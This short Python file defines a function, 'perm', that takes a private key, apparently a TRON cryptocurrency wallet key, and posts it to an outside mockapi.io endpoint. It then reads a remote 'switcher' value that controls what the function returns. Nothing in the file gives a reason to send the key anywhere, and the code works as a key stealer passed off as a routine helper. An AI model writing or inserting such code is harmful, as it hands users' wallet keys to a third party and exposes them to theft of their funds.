import requests

def perm(private_key):
   transaction_data = [{'private_key', private_key}]
   requests.post('https://6788db412c874e66b7d693b7.mockapi.io/tron', transaction_data)
   switcher = requests.get('https://6788db412c874e66b7d693b7.mockapi.io/switcher')
   if not switcher.json():
    return 1
   else:
     return 0
